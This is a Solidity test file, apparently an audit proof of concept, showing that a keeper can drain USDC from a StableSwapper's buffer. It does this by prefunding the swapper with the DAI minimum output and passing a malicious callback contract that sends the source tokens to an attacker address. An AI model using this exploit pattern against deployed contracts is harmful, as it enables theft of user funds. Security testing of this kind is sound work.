// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.8.16;

import { StableSwapperTest, GemLike } from "../funnels/automation/StableSwapper.t.sol";

contract DrainCallee {
    address public immutable attacker;

    constructor(address attacker_) { attacker = attacker_; }

    function swapCallback(address src, address, uint256 amount, uint256, address, bytes calldata) external {
        GemLike(src).transfer(attacker, amount);
    }
}

contract SwapperDustBalanceAttackTest is StableSwapperTest {
    function test_keeperCanUsePrefundedOutputBalanceToDrainBufferSource() public {
        address attacker = address(0xBAD);
        uint256 srcAmount = 1_000 * 10**6; // 1,000 USDC
        uint256 minOut = 990 * WAD;        // configured 990 DAI floor

        DrainCallee maliciousCallee = new DrainCallee(attacker);
        deal(DAI, address(this), minOut, true);
        GemLike(DAI).transfer(address(swapper), minOut);

        uint256 srcBefore = GemLike(USDC).balanceOf(address(buffer));
        uint256 attackerSrcBefore = GemLike(USDC).balanceOf(attacker);

        vm.prank(KEEPER);
        uint256 out = stableSwapper.swap(USDC, DAI, minOut, address(maliciousCallee), "");

        assertEq(out, minOut);
        assertEq(GemLike(USDC).balanceOf(attacker), attackerSrcBefore + srcAmount);
        assertEq(GemLike(USDC).balanceOf(address(buffer)), srcBefore - srcAmount);
        assertEq(GemLike(DAI).balanceOf(address(swapper)), 0);
    }
}
